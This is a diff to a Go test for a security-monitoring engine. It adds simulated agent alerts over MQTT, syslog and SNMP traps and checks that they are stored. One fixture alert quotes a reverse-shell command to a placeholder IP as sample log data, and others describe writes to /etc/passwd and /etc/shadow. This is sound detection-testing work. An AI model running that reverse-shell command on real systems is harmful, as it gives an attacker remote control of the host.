@@ -107,5 +107,48 @@ func TestEngine_ProcessSyslog(t *testing.T) {
 		t.Errorf("expected 1 winEventID entity, got %d", len(winData))
 	}
 
+	// 7. twagentneo MQTT (metrics, alert, fim, tcp)
+	engine.ProcessMQTTMsg("agent-01", "10.0.0.55", "twsnmpneo/agent/agent-01/metrics", []byte(`{"agent_id":"agent-01","hostname":"agent-host-01","os":"linux","version":"v1.2.0","ip":"10.0.0.55","mac":"00:11:22:33:44:55","cpu_percent":35.5,"mem_percent":62.1,"disk_used_percent":48.0,"rx_mbps":10.2,"tx_mbps":3.4}`))
+	engine.ProcessMQTTMsg("agent-01", "10.0.0.55", "twsnmpneo/agent/agent-01/alert", []byte(`{"timestamp":"2026-10-25T05:00:00Z","agent_id":"agent-01","hostname":"agent-host-01","level":"HIGH","category":"security","rule_title":"Reverse Shell","source_log":"bash -i >& /dev/tcp/198.51.100.10/4444","ai_judgment":{"is_threat":true,"confidence":0.96,"summary_ja":"リバースシェル検知","recommended_action_ja":"プロセス停止と隔離","compliance_violated":true,"compliance":["PCI-DSS","CIS"]}}`))
+	engine.ProcessMQTTMsg("agent-01", "10.0.0.55", "twsnmpneo/agent/agent-01/fim", []byte(`{"timestamp":"2026-10-25T05:00:01Z","agent_id":"agent-01","hostname":"agent-host-01","level":"MEDIUM","category":"fim","rule_title":"FIM: WRITE /etc/passwd","source_log":"path=/etc/passwd op=WRITE hash=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"}`))
+	engine.ProcessMQTTMsg("agent-01", "10.0.0.55", "twsnmpneo/agent/agent-01/tcp", []byte(`[{"remote_ip":"8.8.8.8","process":"curl","services":["https"],"count":2}]`))
+
+	// 8. twagentneo RFC 5424 Syslog
+	engine.ProcessSyslog(map[string]interface{}{
+		"app_name":        "twagentneo",
+		"hostname":        "agent-host-01",
+		"structured_data": `[twsnmpneo@17862 rule="Brute Force SSH" threat="YES" comp="NO"]`,
+		"message":         "AI Summary: SSH brute force attempt",
+		"severity":        3,
+		"timestamp":       now,
+	})
+
+	// 9. twagentneo SNMP Trap
+	engine.ProcessTrap(map[string]interface{}{
+		"Time":        now.UnixNano(),
+		"FromAddress": "10.0.0.55(agent-host-01)",
+		"TrapType":    "twagentNeoFIMTrap",
+		"Variables":   "twagentNeoHostname.0=agent-host-01, twagentNeoTrapSeverity.0=HIGH, twagentNeoTrapCategory.0=fim, twagentNeoTrapRuleTitle.0=FIM: CHMOD /etc/shadow, twagentNeoTrapSourceLog.0=path=/etc/shadow op=CHMOD",
+	})
+
+	engine.Flush()
+
+	agentInfo, err := store.ListLogReportData(ctx, KindTwAgentInfo)
+	if err != nil || len(agentInfo) == 0 {
+		t.Fatalf("expected twAgentInfo entities, got %d (err: %v)", len(agentInfo), err)
+	}
+	agentAlerts, err := store.ListLogReportData(ctx, KindTwAgentAlert)
+	if err != nil || len(agentAlerts) < 2 {
+		t.Fatalf("expected >= 2 twAgentAlert entities, got %d (err: %v)", len(agentAlerts), err)
+	}
+	agentFIM, err := store.ListLogReportData(ctx, KindTwAgentFIM)
+	if err != nil || len(agentFIM) < 2 {
+		t.Fatalf("expected >= 2 twAgentFIM entities, got %d (err: %v)", len(agentFIM), err)
+	}
+	agentTCP, err := store.ListLogReportData(ctx, KindTwAgentTCP)
+	if err != nil || len(agentTCP) != 1 {
+		t.Fatalf("expected 1 twAgentTCP entity, got %d (err: %v)", len(agentTCP), err)
+	}
+
 	engine.Stop()
 }
